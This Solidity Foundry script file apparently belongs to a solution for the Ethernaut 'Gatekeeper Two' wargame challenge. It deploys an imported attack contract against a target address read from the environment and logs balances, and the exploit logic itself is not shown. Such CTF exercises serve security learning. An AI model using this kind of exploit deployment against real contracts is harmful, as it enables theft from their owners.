// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {GatekeeperTwoAttack, IGatekeeperTwo} from "../src/GatekeeperTwoAttack.sol";

contract Deploy is Script {
    function run() external {
        address target = vm.envAddress("GATEKEPEER2_ADDRESS");

        vm.startBroadcast();
        GatekeeperTwoAttack attacker = new GatekeeperTwoAttack(target);
        vm.stopBroadcast();
        
        console2.log("Attacker depoyed at: ", address(attacker));
        console2.log("Victim balance: ", address(target).balance);
        console2.log("Attacker balacnce: ", address(attacker).balance);
        console2.log("Put GATEKEPEER2_ATTACKER_ADDRESS in .env: ");
    }
}

contract Attack is Script {
    function run() external {
        address attackerAddress = vm.envAddress("GATEKEPEER2_ATTACKER_ADDRESS");
        address target = vm.envAddress("GATEKEPEER2_ADDRESS");
        IGatekeeperTwo reentrance = IGatekeeperTwo(target);
        

        vm.startBroadcast();
        GatekeeperTwoAttack attacker = GatekeeperTwoAttack(payable(attackerAddress));
        vm.stopBroadcast();

        console2.log("attack finished, the victim balance is: ", address(reentrance).balance);
    }
}